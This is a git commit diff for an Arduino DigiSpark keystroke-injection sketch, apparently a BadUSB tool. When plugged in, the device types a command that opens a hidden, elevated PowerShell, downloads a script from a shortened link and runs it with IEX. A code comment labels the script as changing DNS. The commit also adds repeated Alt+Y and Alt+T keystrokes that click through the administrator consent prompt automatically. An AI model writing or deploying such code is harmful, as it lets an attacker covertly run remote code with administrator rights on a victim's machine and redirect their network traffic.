0a6e32229b22e1ecbab34dd2d6ebc954073120a4
Matik <mateusz.kisiel.mk@gmail.com>
2022-02-17 01:10:43 +0100

    added dns link to run admin script

--- run_script_admin/run_script_admin.ino
+++ run_script_admin/run_script_admin.ino
@@ -6,14 +6,24 @@ void winRun(const char* command){
   DigiKeyboard.println(command);
 }
 
+void confirm(){
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+  
+}
 void setup() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(0);
 
-  winRun("powershell \"Start-Process powershell -Verb RunAs -ArgumentList '-W','Hidden', \\\"IEX (New-Object Net.WebClient).DownloadString(\'https://bit.ly/3HXQQOr\');\\\"  \"  ");
-  DigiKeyboard.delay(2000);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT);
+  /// change dns: https://bit.ly/3gP18o7
+  winRun("powershell \"Start-Process powershell -Verb RunAs -ArgumentList '-W','Hidden', \\\"IEX (New-Object Net.WebClient).DownloadString(\'https://bit.ly/3gP18o7\');\\\"  \"  ");
+  DigiKeyboard.delay(1000);
+  confirm();
+  confirm();
+  confirm();
+  confirm();
+  confirm();
 }
 
 void loop() {
